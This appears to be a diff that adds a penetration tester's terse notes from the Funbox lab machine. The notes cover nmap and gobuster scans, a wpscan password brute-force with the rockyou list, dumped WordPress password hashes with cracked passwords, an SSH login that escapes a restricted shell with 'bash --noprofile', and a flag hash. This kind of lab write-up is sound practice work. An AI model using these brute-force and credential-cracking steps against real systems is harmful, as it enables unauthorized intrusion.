@@ -1,0 +1,24 @@
+nmap -sV -sC -Pn 192.168.78.77 > nmap.txt
+gobuster dir -u http://funbox.fritz.box/secret/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  > gobustersecret.txt
+gobuster dir -u http://funbox.fritz.box/ -w /usr/share/dirb/wordlists/common.txt > gobuster.txt
+
+
+wpscan --url http://funbox.fritz.box --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
+
+
+
+|  1 | admin      | $P$BGUPID16QexYI9XRblG9k8rnr0TMJN1 | admin         | funny@funbox.box |          | 2020-06-19 11:32:16 |                                               |           0 | admin        |
+|  2 | joe        | $P$BE8LMdNTNUfpD5w3h5q2DnGGalSHcY1 | joe           | joe@funbox.box   |          | 2020-06-19 11:46:42 | 1592567203: |           0 | joe miller
+                    $P$B7eKG/1s3GPGXCUM/h.lmWqaZ2Udvq1
+
+$P$BE8LMdNTNUfpD5w3h5q2DnGGalSHcY1:12345                                                                           │
+$P$BGUPID16QexYI9XRblG9k8rnr0TMJN1:iubire
+
+ssh joe@192.168.78.77  "bash --noprofile"
+
+13114ac7b9993dae9c70e48e67228be3
+ ssh psj@server_name-t "bash --noprofile"
+
+
+
+ Linux funbox 5.4.0-40-generic
